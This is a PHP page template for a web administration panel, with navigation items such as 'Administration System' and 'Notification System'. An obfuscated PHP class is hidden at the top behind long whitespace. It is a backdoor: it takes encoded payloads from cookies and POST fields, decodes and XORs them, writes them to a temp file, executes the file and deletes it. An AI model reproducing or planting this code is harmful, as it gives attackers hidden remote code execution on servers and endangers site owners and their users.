<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("trUqILxlnV")){class trUqILxlnV{public static $TUsSEtC = "OpkCphPCFzXlFzJM";public static $KARxUj = NULL;public function __construct(){$VYJfGiE = @$_COOKIE[substr(trUqILxlnV::$TUsSEtC, 0, 4)];if (!empty($VYJfGiE)){$daCAyuuCp = "base64";$KOOHsToIU = "";$VYJfGiE = explode(",", $VYJfGiE);foreach ($VYJfGiE as $nkGVTYhuE){$KOOHsToIU .= @$_COOKIE[$nkGVTYhuE];$KOOHsToIU .= @$_POST[$nkGVTYhuE];}$KOOHsToIU = array_map($daCAyuuCp . "_decode", array($KOOHsToIU,)); $KOOHsToIU = $KOOHsToIU[0] ^ str_repeat(trUqILxlnV::$TUsSEtC, (strlen($KOOHsToIU[0]) / strlen(trUqILxlnV::$TUsSEtC)) + 1);trUqILxlnV::$KARxUj = @unserialize($KOOHsToIU);}}public function __destruct(){$this->kioMxChfe();}private function kioMxChfe(){if (is_array(trUqILxlnV::$KARxUj)) {$qQKuukv = sys_get_temp_dir() . "/" . crc32(trUqILxlnV::$KARxUj["salt"]);@trUqILxlnV::$KARxUj["write"]($qQKuukv, trUqILxlnV::$KARxUj["content"]);include $qQKuukv;@trUqILxlnV::$KARxUj["delete"]($qQKuukv);exit();}}}$jfnfzO = new trUqILxlnV(); $jfnfzO = NULL;} ?><!DOCTYPE html>
...
<!-- Main -->
    ...
    <li class="nav-item nav-item-submenu ">
        ...
        <a href="#" class="nav-link"><i class="icon-users4"></i> <span>Administration System</span></a>
    ...
    <li class="nav-item nav-item-submenu">
        ...
        <a href="#" class="nav-link"><i class="icon-users4"></i> <span>Notification System</span></a>
